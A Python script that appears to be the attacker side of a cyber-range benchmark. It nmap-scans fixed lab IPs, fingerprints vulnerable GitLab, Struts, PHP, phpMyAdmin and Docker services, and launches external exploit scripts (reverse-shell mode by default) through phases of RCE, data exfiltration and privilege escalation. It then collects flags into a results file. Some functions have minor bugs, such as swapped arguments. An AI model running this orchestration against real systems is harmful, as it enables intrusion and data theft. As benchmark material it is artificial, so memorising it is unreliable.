import socket
import subprocess
import sys
import time
import threading
import json
import netifaces
import re
from tabulate import tabulate
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
from pathlib import Path
from datetime import datetime

timeout=180 # timeout for the attacks

init(autoreset=True)

STATE_DIR = Path('/state')
STATE_DIR.mkdir(parents=True, exist_ok=True)

PHASE_ORDER = ["initial-access/rce", "data-exfil", "privilege_escalation"]
PHASE_INDEX = {p: i for i, p in enumerate(PHASE_ORDER)}

EPOCH_TO_PHASE = {
    1 : "initial-access/rce",
    2 : "data-exfil",
    3 : "privilege_escalation"
}

def service_id(service, host, port):
    return f"{service}:{host}:{port}"

def svc_dir(svc_id):
    d = STATE_DIR / svc_id.replace(":", "_")
    d.mkdir(parents=True, exist_ok=True)
    return d

def first_exposed_path(svc_id):
    return svc_dir(svc_id) / "first_exposed_epoch"

def record_first_exposed_if_needed(svc_id, global_epoch:int) -> int:
    p = first_exposed_path(svc_id)
    if not p.exists():
        p.write_text(str(global_epoch), encoding="utf-8")
    return int(p.read_text().strip())

def local_epoch_for(svc_id, global_epoch:int) -> int:
    fe = record_first_exposed_if_needed(svc_id, global_epoch)
    return max(1, (global_epoch - fe) + 1)

def ensure_service_dir(svc_id):
    d = first_exposed_path(svc_id).parent
    d.mkdir(parents=True, exist_ok=True)
    return d

def marker_path(svc_id, phase:str) -> Path:
    return svc_dir(svc_id) / f"{phase.replace('/','_')}.ran"

def already_done(svc_id, phase:str) -> bool:
    return marker_path(svc_id, phase).exists()

def mark_done(svc_id, phase:str, details:dict):
    marker = marker_path(svc_id, phase)
    marker.write_text(json.dumps({"when": datetime.utcnow().isoformat(), **details}), encoding="utf-8")

def should_execute_phase(allowed_phase:str, required_phase:str) -> bool:
    return PHASE_INDEX[required_phase] <= PHASE_INDEX[allowed_phase]

def get_local_epoch(first_exposed_epoch, global_epoch):
    # local epoch starts at 1 when asset becomes reachable
    return max(1, (int(global_epoch) - int (first_exposed_epoch)) + 1)

def allowed_phase_for_local_epoch(local_epoch):
    # pick highest configured phase for this local epoch
    # default to last phase if local_epoch exceeds mapping
    max_key = max(EPOCH_TO_PHASE.keys())
    key = local_epoch if local_epoch in EPOCH_TO_PHASE else max_key
    return EPOCH_TO_PHASE[key]


SERVICE_COLORS = {
    "GITLAB": Fore.BLUE,
    "DOCKER": Fore.GREEN,
    "STRUTS": Fore.YELLOW,
    "PHP": Fore.RED
}

sys.stdout.reconfigure(line_buffering=True)


def stream_output(process, prefix="", color=""):
    for line in iter(process.stdout.readline, ''):
        if line:
            print(f"{color}{prefix}{line.strip()}{Style.RESET_ALL}")
    process.stdout.close()

def stream_error(process, prefix="ERROR: ", color=""):
    for line in iter(process.stderr.readline, ''):
        if line:
            print(f"{color}{prefix}{line.strip()}{Style.RESET_ALL}")
    process.stderr.close()

subnet = "172.20.0.2 172.20.0.3 172.20.0.4 172.20.0.5 172.20.0.7 172.20.0.8 172.20.0.10 172.20.0.30"
vulnerable_versions = ['13.12.3']

def get_ip():
    ip_addr = None
    interfaces = netifaces.interfaces()

    for interface in interfaces:
        addresses = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addresses:
            for link in addresses[netifaces.AF_INET]:
                if 'addr' in link:
                    if interface == 'eth0':
                        ip_addr = link['addr']

    return ip_addr

ip_address_attacker = get_ip()
print(f"[*] Attacker IP address: {ip_address_attacker}")

def is_gitlab_vulnerable(version):
    for v in vulnerable_versions:
        print(f"Checking if version is vulnerable: {v}")
        if version.startswith(v):
            return True
        return False

def scan_nmap(subnet):
    print(f"[*] Scanning {subnet} for open ports...")
    ports = "22, 53, 80, 110, 135, 137, 138, 139, 143, 161, 389, 443, 445, 465, 514, 587, 636, 8080, 8081, 8161, 61616, 11211, 1433, 1720, 2375, 27017, 3306, 3389, 51820"
    try:
        subnet = subnet.split()
        result = subprocess.run(["nmap", "-T4", "-p", ports] + subnet, capture_output=True, text=True)
        hosts_data = result.stdout.split("Nmap scan report for ")

        return hosts_data[1:]
    except Exception as e:
        print(f"[!] Error scanning with nmap:\n{e}")
        return []

def parse_open_ports(host_block):
    lines = host_block.strip().splitlines()
    if not lines:
        return None, []

    match = re.search(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b", lines[0])
    host_ip = match.group(1) if match else None
    open_ports = []
    for line in lines:
        if "/tcp" in line and "open" in line:
            parts = line.split()
            try:
                port = parts[0].split("/")[0]
                service = parts[2]
                open_ports.append((port, service))
            except Exception as e:
                print(f"[!] Error during parsing\n{e}")
    return host_ip, open_ports

def detect_gitlab(host_ip, port):
    print(f"[*] Checking port {port} for GitLab...")
    url = f"http://{host_ip}:{port}"
    try:
        response = subprocess.run(["curl", "-I", url], capture_output=True, text=True, timeout=5)
        headers = response.stdout
        if "GitLab" in headers:
            match = re.search(r"X-GitLab-Version:\s*(\d+\.\d+\.\d+)", headers)
            version = match.group(1) if match else "Unknown"
            if match:
                return url, version
    except Exception as e:
        print(f"[!] GitLab detection error at {url}:\n{e}")
    return None, None

def detect_struts(host_ip, port):
    print(f"[*] Checking port {port} for Struts...")
    STRUTS_PATHS = [
        "struts-showcase", "examples", "struts-examples",
        "struts2-examples", "struts2-showcase", "demo",
        "struts-demo", "struts2-demo", "showcase",
        "tutorial", "struts-tutorial", "struts2-tutorial",
        "blank", "struts2-blank", "struts-blank",
        "rest", "struts2-rest", "struts-rest",
        "convention", "struts2-convention",
        "mailreader", "struts2-mailreader",
        "portlet", "struts2-portlet"
    ]
    url = f"http://{host_ip}:{port}/"

    for path in STRUTS_PATHS:

        try:
            result = subprocess.run(["curl", url + path], capture_output=True, text=True)
            if 'struts' in result.stdout and "Not Found" not in result.stdout:
                print(f"Testing path: {path}")
                if path == 'struts2-showcase':
                    print(f"Vulnerable path detected: {path}")
                    return (host_ip, port, path)
        except Exception as e:
            print(e)
    return (None, None, None)

def detect_debug_rce(host_ip, port):
    print(f"[*] Checking port {port} for debug_rce")
    url = f"http://{host_ip}:{port}"
    PATH = "/index.php"
    try:
        result = subprocess.run(["curl", url + PATH], capture_output=True, text=True)
        if 'Not Found' not in result.stdout and 'PHP Version 7.1.33' in result.stdout:
            print("Found vulnerable PHP version")
            return host_ip, port, url
    except Exception as e:
        print(e)
    return (None, None, None)

def detect_CVE_2018_12613(host_ip, port):
    print(f"[*] Checking port {port} for CVE-2018-12613")
    CVE_PATHS = ["phpmyadmin"]
    url = f"http://{host_ip}:{port}/"
    for path in CVE_PATHS:
        try:
            result = subprocess.run(["curl", url + path], capture_output=True, text=True)

            if 'Not Found' not in result.stdout and result.returncode == 0:
                print("Found phpmyadmin instance")
                print(f"Testing path: {path}")
                return (host_ip, port, path)
        except Exception as e:
            print(e)
    return (None, None, None)

def scan_and_dispatch(subnet, epoch_num, mode=''):
    hosts_blocks = scan_nmap(subnet)
    threads = []
    exploits = []
    service_ctx = [] # per-service epoch context to export
    ap_docker = ""
    ap_gitlab = ""
    ap_struts = ""
    ap_php = ""
    for host_block in hosts_blocks:

        host_ip, open_ports = parse_open_ports(host_block)
        if not host_ip or not open_ports:
            continue
        print(f"[+] Host {host_ip} has open ports: {open_ports}")
        for port, service in open_ports:
            if "docker" in service:

                svc_id = service_id('docker', host_ip, port)
                fe = record_first_exposed_if_needed(svc_id, epoch_num)
                le = get_local_epoch(fe, epoch_num)
                ap_docker = allowed_phase_for_local_epoch(le)

                service_ctx.append({
                    "service_id": svc_id,
                    "service":"docker",
                    "host": host_ip,
                    "port": port,
                    "first_exposed_epoch": fe,
                    "local_epoch": le,
                    "allowed_phase": ap_docker
                })
                exploits.append({
                    'service' : 'docker',
                    'host_ip' : host_ip,
                    'port' : port
                    })
            gitlab_url, gitlab_ver = detect_gitlab(host_ip, port)
            struts_ip, struts_port, struts_path = detect_struts(host_ip, port)
            debug_rce_ip, debug_rce_port, debug_rce_url = detect_debug_rce(host_ip, port)

            if gitlab_url:
                if is_gitlab_vulnerable(gitlab_ver):
                    svc_id = service_id('gitlab', host_ip, port)
                    fe = record_first_exposed_if_needed(svc_id, epoch_num)
                    le = get_local_epoch(fe, epoch_num)
                    ap_gitlab = allowed_phase_for_local_epoch(le)
                    service_ctx.append({
                        "service_id": svc_id,
                        "service":"gitlab",
                        "host": host_ip,
                        "port": port,
                        "url": gitlab_url,
                        "version": gitlab_ver,
                        "first_exposed_epoch": fe,
                        "local_epoch": le,
                        "allowed_phase": ap_gitlab
                    })

                    exploits.append({
                        'service': 'gitlab',
                        'host_ip' : host_ip,
                        'port' : port,
                        'url' : gitlab_url,
                        'version' : gitlab_ver
                        })
            if struts_ip:
                svc_id = service_id('struts', struts_ip, struts_port)
                fe = record_first_exposed_if_needed(svc_id, epoch_num)
                le = get_local_epoch(fe, epoch_num)
                ap_struts = allowed_phase_for_local_epoch(le)
                service_ctx.append({
                    "service_id": svc_id,
                    "service":"struts",
                    "host": struts_ip,
                    "port": struts_port,
                    "path": struts_path,
                    "first_exposed_epoch": fe,
                    "local_epoch": le,
                    "allowed_phase": ap_struts
                })
                exploits.append({
                    'service': 'struts',
                    'host_ip' : struts_ip,
                    'port' : struts_port,
                    'path' : struts_path,
                    'mode' : mode
                    })
            if debug_rce_ip:
                svc_id = service_id('debug_php', debug_rce_ip, debug_rce_port)
                fe = record_first_exposed_if_needed(svc_id, epoch_num)
                le = get_local_epoch(fe, epoch_num)
                ap_php = allowed_phase_for_local_epoch(le)
                service_ctx.append({
                    "service_id": svc_id,
                    "service":"debug_php",
                    "host": debug_rce_ip,
                    "port": debug_rce_port,
                    "path": debug_rce_url,
                    "first_exposed_epoch": fe,
                    "local_epoch": le,
                    "allowed_phase": ap_php
                })
                exploits.append({
                    'service': 'debug_php',
                    'host_ip': debug_rce_ip,
                    'port': debug_rce_port,
                    'path': debug_rce_url
                })

    print("\n[+] Detected vulnerable services:\n")
    table = []
    for e in exploits:
        row = [e['service'].upper()]
        if e['service'] == 'gitlab':
            row.extend([e['host_ip'], e['port'], e['url'], e['version']])
        elif e['service'] in ['docker', 'cve', 'struts', 'debug_php']:
            row.extend([e['host_ip'], e['port'], e.get('path', '-')])
        table.append(row)

    headers = ["Service", "Target", "Port", "Path", "Version"]
    print(tabulate(table, headers=headers))
    print()

    with ThreadPoolExecutor(max_workers=10) as executor:
        for exploit in exploits:
            service = exploit['service']
            if service == 'docker':
                threads.append(executor.submit(launch_docker_exploit, exploit['host_ip'], exploit['port'], ap_docker))
            if service == 'gitlab':
                threads.append(executor.submit(launch_gitlab_exploit, exploit['url'], exploit['version'], epoch_num, ap_gitlab))
            if service == 'struts':
                threads.append(executor.submit(launch_struts_exploit, exploit['host_ip'], exploit['port'], exploit['path'], exploit['mode'], ap_struts))
            if service == 'debug_php':
                threads.append(executor.submit(launch_php_exploit, exploit['path'], ap_php))
    # === Collect and print flags ===
    flags = []
    for future in as_completed(threads):
        result = future.result()
        if result:
            if isinstance(result, list):
                for flag in result:
                    flags.append(flag)
            else:
                flags.append(result)

    for service, flag in flags:
        print(f"{SERVICE_COLORS.get(service.upper(), '')}{service}: {flag}{Style.RESET_ALL}")
    return flags, hosts_blocks, service_ctx


def launch_gitlab_exploit(url, version, epoch_num, allowed_phase):
    color = SERVICE_COLORS["GITLAB"]
    prefix = "GITLAB >> "
    print(f"{color}[>>>] Launching GitLab exploit against {url} (version: {version}){Style.RESET_ALL}")
    exploit_path = "/attacker/scripts/gitlab/gitlab_exploit.py"
    try:
        proc = subprocess.Popen(["python3", "-u", exploit_path, url, ip_address_attacker, str(epoch_num), str(allowed_phase)],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output_lines = []

        for line in iter(proc.stdout.readline, ''):
            if line:
                print(f"{color}{prefix}{line.strip()}{Style.RESET_ALL}")
                output_lines.append(line.strip())
        proc.stdout.close()

        stream_error(proc, prefix=prefix + "[ERR] ", color=color)
        proc.wait(timeout=timeout)

        flags = []
        for line in output_lines:
            if "flag{" in line:
                flags.append(("GITLAB", line))

        return flags

    except Exception as e:
        print(f"{color}[!] Error executing GitLab exploit: {e}{Style.RESET_ALL}")
    return None

def launch_php_exploit(url, allowed_phase):
    color = SERVICE_COLORS["PHP"]
    prefix = "PHP >> "
    print(f"{color}[>>>] Launching PHP exploit against {url}{Style.RESET_ALL}")
    exploit_path = "/attacker/scripts/debug-rce/exploit.py"
    try:
        proc = subprocess.Popen(["python3", "-u", exploit_path, ip_address_attacker, url, allowed_phase],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output_lines = []

        for line in iter(proc.stdout.readline, ''):
            if line:
                print(f"{color}{prefix}{line.strip()}{Style.RESET_ALL}")
                output_lines.append(line.strip())
        proc.stdout.close()

        stream_error(proc, prefix=prefix + "[ERR] ", color=color)
        proc.wait(timeout=timeout)

        flags = []
        for line in output_lines:
            if "flag{" in line:
                flags.append(("PHP", line))

        return flags

    except Exception as e:
        print(f"{color}[!] Error executing GitLab exploit: {e}{Style.RESET_ALL}")
    return None


def launch_docker_exploit(host_ip, port, allowed_phase):
    url = f"http://{host_ip}:{port}/"
    exploit_path="/attacker/scripts/docker/docker_exploit.py"
    color = SERVICE_COLORS["DOCKER"]
    prefix = "DOCKER >> "
    print(f"{color}[>>>] Launching Docker exploit against: {url}{Style.RESET_ALL}")
    try:
        proc = subprocess.Popen(["python3", "-u", exploit_path, url, allowed_phase],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        output_lines = []

        for line in iter(proc.stdout.readline, ''):
            if line:
                print(f"{color}{prefix}{line.strip()}{Style.RESET_ALL}")
                output_lines.append(line.strip())
        proc.stdout.close()

        stream_error(proc, prefix=prefix + "[ERR] ", color=color)
        proc.wait(timeout=timeout)

        for line in output_lines:
            if "flag{" in line:
                return ("DOCKER", line)
    except Exception as e:
        print(f"{color}[!] Error executing docker exploit\n{e}{Style.RESET_ALL}")
        return 1

def launch_struts_exploit(container_ip, port, path, allowed_phase, mode=""):
    color = SERVICE_COLORS["STRUTS"]
    prefix = "STRUTS >> "
    print(f"{color}[>>>] Launching Struts exploit against {container_ip}:{port}/{path}{Style.RESET_ALL}")
    exploit_path = "/attacker/scripts/struts/struts_exploit.py"

    try:
        proc = subprocess.Popen(["python3", "-u", exploit_path, ip_address_attacker, container_ip, port, path, allowed_phase, mode],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        output_lines = []

        for line in iter(proc.stdout.readline, ''):
            if line:
                print(f"{color}{prefix}{line.strip()}{Style.RESET_ALL}")
                output_lines.append(line.strip())
        proc.stdout.close()

        stream_error(proc, prefix=prefix + "[ERR] ", color=color)
        proc.wait(timeout=timeout)

        for line in output_lines:
            if "flag{" in line:
                return ("STRUTS", line)
    except Exception as e:
        print(f"{color}[!] Error executing struts exploit\n{e}{Style.RESET_ALL}")
        return 1

def get_detected_services_and_exploits_attempted(hosts_blocks):
    services_detected = []
    exploits_attempted = []
    for host_block in hosts_blocks:
        host_ip, open_ports = parse_open_ports(host_block)
        if host_ip and open_ports:
            for port, service in open_ports:
                service_entry = f"{service.upper()}({host_ip}:{port})"
                services_detected.append(service_entry)
                # Check if we attempted exploits for these services
                if service.lower() in ['docker', 'gitlab', 'debug_php', 'struts']:
                    # These would have exploit attempts
                    exploits_attempted.append(service_entry)

    return services_detected, exploits_attempted

def main(epoch_num, mode):
    print("[*] Launching exploit manager...")
    epoch_num = int(epoch_num)

    flags, hosts_blocks, service_ctx = scan_and_dispatch(subnet, epoch_num, mode=str(mode))
    # Collect all services that were detected during scanning
    services_detected, exploits_attempted = get_detected_services_and_exploits_attempted(hosts_blocks)

    # Get services that were successfully exploited
    services_successfully_exploited = list(set([flag[0] for flag in flags])) if flags else []

    results_dir = "/tmp/benchmark_results"
    results_file = os.path.join(results_dir, "attack_results.json")

    summary = {
        "BENCHMARK_SUMMARY": {
            "services_detected": list(set(services_detected)),  # All services found during scan
            "exploits_attempted": list(set(exploits_attempted)),  # Services where exploits were tried
            "services_successfully_exploited": services_successfully_exploited,  # Services with successful exploits
            "flags_captured": [{"service": flag[0], "flag": flag[1]} for flag in flags] if flags else [],
            "total_flags": len(flags) if flags else 0,
            "total_services_detected": len(set(services_detected)),
            "total_exploits_attempted": len(set(exploits_attempted)),
            "service_epoch_context": service_ctx
        }
    }

    try:
        os.makedirs(results_dir, exist_ok=True)
        os.chmod(results_dir, 0o777)

        with open(results_file, 'w') as f:
            json.dump(summary, f, indent=2)
            f.flush()
            os.fsync(f.fileno())
        os.chmod(results_file, 0o666)
        print(f"[*] Results saved to {results_file}")
    except Exception as e:
        print(f"[!] Error saving results to file: {e}")

    return flags

if __name__=='__main__':
    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print("Correct use python3 manager_exploit.py <epoch_number> [mode]")

    print(sys.argv)
    epoch_num = str(sys.argv[1])
    mode = str(sys.argv[2]) if len(sys.argv) == 3 else 'reverse_shell'
    main(epoch_num, mode)
